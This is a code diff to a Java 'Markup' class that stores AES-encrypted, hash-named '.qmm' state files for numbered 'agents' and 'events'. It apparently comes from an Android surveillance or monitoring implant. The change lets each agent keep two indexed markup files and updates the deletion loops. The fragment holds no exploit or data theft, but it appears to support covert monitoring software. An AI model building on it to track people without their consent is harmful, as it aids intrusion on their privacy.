@@ -17,6 +17,7 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
+import java.util.HashMap;
 
 import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
@@ -35,8 +36,9 @@ import com.android.service.util.Utils;
 public class Markup {
 
 	private static final String TAG = "Markup"; //$NON-NLS-1$
- //$NON-NLS-1$
+	//$NON-NLS-1$
 	public static final String MARKUP_EXTENSION = ".qmm"; //$NON-NLS-1$
+	private static final int MAX_MARKUPS = 2;
 	public static byte markupSeed;
 	public static boolean markupInit;
 	private String agentId = "core"; //$NON-NLS-1$
@@ -44,6 +46,8 @@ public class Markup {
 	private String lognName;
 	private AutoFile file;
 	private final Encryption encryption;
+	
+	int num=0;
 
 	private Markup() {
 		encryption = new Encryption(Keys.self().getAesKey());
@@ -66,6 +70,12 @@ public class Markup {
 		this();
 		agentId = id.toString();
 	}
+	
+	public Markup(final Integer id, int num) {
+		this();
+		agentId = id.toString();
+		this.num=num;
+	}
 
 	/**
 	 * Crea un markup vuoto.
@@ -76,17 +86,22 @@ public class Markup {
 		return writeMarkup(null);
 	}
 
+	private String makeMarkupName(String id, boolean b) {
+		return makeMarkupName(id, num, b);
+	}
+
 	/**
 	 * 
 	 * @param agentId
 	 *            the agent id
+	 * @param num
 	 * @param addPath
 	 *            the add path
 	 * @return the string
 	 */
-	static String makeMarkupName(String agentId, final boolean addPath) {
+	static String makeMarkupName(String agentId, int num, final boolean addPath) {
 		// final String markupName = Integer.toHexString(agentId);
-		final String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes()));
+		final String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes())) + num;
 		if (Cfg.DEBUG) {
 			Check.requires(markupName != null, "null markupName"); //$NON-NLS-1$
 		}
@@ -127,9 +142,9 @@ public class Markup {
 	 * @return
 	 */
 
-	public static synchronized boolean removeMarkup(final String value) {
+	public static synchronized boolean removeMarkup(final String value, int num) {
 
-		final String markupName = makeMarkupName(value, true);
+		final String markupName = makeMarkupName(value, num, true);
 
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -144,8 +159,8 @@ public class Markup {
 		}
 	}
 
-	public static boolean removeMarkup(final Integer value) {
-		return removeMarkup(value.toString());
+	public static boolean removeMarkup(final Integer value, int num) {
+		return removeMarkup(value.toString(), num);
 	}
 
 	/**
@@ -158,23 +173,19 @@ public class Markup {
 
 		int numDeleted = 0;
 		for (final int type : AgentType.values()) {
-			if (removeMarkup(type)) {
-				numDeleted++;
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
+			for (int i = 0; i < MAX_MARKUPS; i++) {
+				if (removeMarkup(type, i)) {
+					numDeleted++;
 				}
 			}
 		}
 
 		for (final int type : EventType.values()) {
-			if (removeMarkup(type)) {
-				numDeleted++;
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
+			for (int i = 0; i < MAX_MARKUPS; i++) {
+				if (removeMarkup(type, i)) {
+					numDeleted++;
 				}
-			}
+			}			
 		}
 
 		return numDeleted;
@@ -243,7 +254,7 @@ public class Markup {
 			return plain;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkup): Markup file does not exists") ;//$NON-NLS-1$
+				Check.log(TAG + " Error (readMarkup): Markup file does not exists");//$NON-NLS-1$
 			}
 			return null;
 		}
@@ -276,6 +287,7 @@ public class Markup {
 	 * 
 	 * @param data
 	 *            the data
+	 * @param num
 	 * @return true, if successful
 	 */
 	public synchronized boolean writeMarkup(final byte[] data) {
@@ -307,14 +319,12 @@ public class Markup {
 		return fileRet.exists();
 	}
 
-	public synchronized boolean writeMarkupSerializable(final Serializable object) throws IOException {
-
+	public boolean writeMarkupSerializable(final Serializable object) throws IOException {
 		final ByteArrayOutputStream bos = new ByteArrayOutputStream();
 		final ObjectOutput out = new ObjectOutputStream(bos);
 		out.writeObject(object);
 		final byte[] data = bos.toByteArray();
 		return writeMarkup(data);
-
 	}
 
 	public synchronized Object readMarkupSerializable() throws IOException {
@@ -326,7 +336,7 @@ public class Markup {
 			return o;
 		} catch (final ClassNotFoundException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkupSerializable): " + e) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (readMarkupSerializable): " + e);//$NON-NLS-1$
 			}
 			throw new IOException();
 		}
